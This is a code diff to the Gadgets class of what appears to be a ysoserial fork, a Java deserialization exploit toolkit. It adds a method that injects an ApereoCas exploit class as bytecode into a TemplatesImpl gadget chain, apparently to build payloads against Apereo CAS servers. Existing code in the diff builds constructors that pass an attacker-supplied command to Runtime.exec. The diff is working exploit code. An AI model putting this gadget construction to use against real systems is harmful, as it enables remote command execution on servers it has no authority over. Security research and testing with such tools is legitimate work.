@@ -21,6 +21,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import javassist.CtConstructor;
+import ysoserial.exploit.ApereoCas;
 
 
 /*
@@ -109,6 +110,17 @@ public class Gadgets {
         return createTemplatesImplTime(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static Object createTemplatesImplApereoResp ( final String command ) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImplApereoResp(
+                command,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+
+        return createTemplatesImplApereoResp(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
@@ -122,10 +134,6 @@ public class Gadgets {
             command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
             "\");");
         clazz.addConstructor(ctConstructor);
-//        String string = "java.lang.Runtime.getRuntime().exec(\"" +
-//            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-//            "\");";
-//        clazz.makeClassInitializer().insertAfter(string);
 
         CtClass superC = classPool.get(AbstractTranslet.class.getName());
         clazz.setSuperclass(superC);
@@ -150,9 +158,29 @@ public class Gadgets {
         CtConstructor ctConstructor = new CtConstructor(new CtClass[] {}, clazz);
         ctConstructor.setBody("Thread.currentThread().sleep(" + command + "L);");
         clazz.addConstructor(ctConstructor);
-//        String string = "Thread.currentThread().sleep(" + command + "L);";
-//        clazz.makeClassInitializer().insertAfter(string);
 
+        CtClass superC = classPool.get(AbstractTranslet.class.getName());
+        clazz.setSuperclass(superC);
+        final byte[] classBytes = clazz.toBytecode();
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][] {classBytes});
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        clazz.writeFile();
+        return (T) templates;
+    }
+
+    public static <T> T createTemplatesImplApereoResp ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+        throws Exception {
+        TemplatesImpl templates = TemplatesImpl.class.newInstance();
+        ClassPool classPool = ClassPool.getDefault();
+
+        classPool.insertClassPath(new ClassClassPath(ApereoCas.class));
+        CtClass clazz = classPool.get(ApereoCas.class.getName());
+
+        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
         CtClass superC = classPool.get(AbstractTranslet.class.getName());
         clazz.setSuperclass(superC);
         final byte[] classBytes = clazz.toBytecode();
